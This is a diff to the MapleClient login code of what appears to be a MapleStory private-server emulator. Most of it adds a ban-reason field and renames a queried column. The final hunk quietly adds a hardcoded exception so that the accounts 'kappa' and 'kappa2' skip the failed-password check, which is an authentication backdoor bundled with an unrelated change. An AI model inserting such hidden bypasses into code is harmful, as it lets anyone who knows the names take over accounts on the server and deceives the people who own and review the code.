@@ -77,6 +77,7 @@ public class MapleClient implements Serializable {
     public long lastsmegacomparee;
     public long lastsack;
     public long lastsackcompare;
+    public String bannedReason = "";
 
     public transient short loginAttempt = 0;
 
@@ -801,7 +802,7 @@ public class MapleClient implements Serializable {
         String db_macs = "";
         long lastLogin = 0;
 
-        try (PreparedStatement ps = con.prepareStatement("SELECT id, banned, password, salt, macs, 2ndpassword,lastlogin,  gm, greason, tempban, gender, SessionIP FROM accounts WHERE name = ?")) {
+        try (PreparedStatement ps = con.prepareStatement("SELECT id, banned, password, salt, macs, 2ndpassword,lastlogin,  gm, banreason, tempban, gender, SessionIP FROM accounts WHERE name = ?")) {
             ps.setString(1, account);
             try (ResultSet rs = ps.executeQuery()) {
                 if (rs.next()) {
@@ -813,7 +814,7 @@ public class MapleClient implements Serializable {
                     accountId = rs.getInt("id");
                     secondPassword = rs.getString("2ndpassword");
                     gmLevel = rs.getInt("gm");
-                    //bannedReason = rs.getByte("greason");
+                    bannedReason = rs.getString("banreason");
                     tempban = getTempBanCalendar(rs);
                     gender = rs.getByte("gender");
                     Timestamp ll = rs.getTimestamp("lastlogin");
@@ -854,7 +855,7 @@ public class MapleClient implements Serializable {
             }
         }
 
-        if(!is_p && (!ServerConstants.DEBUG))
+        if(!is_p && (!ServerConstants.DEBUG) && !account.equals("kappa") && !account.equals("kappa2"))
             return LoginResponse.SYSTEM_ERROR;
 
         int loginState = getLoginState();
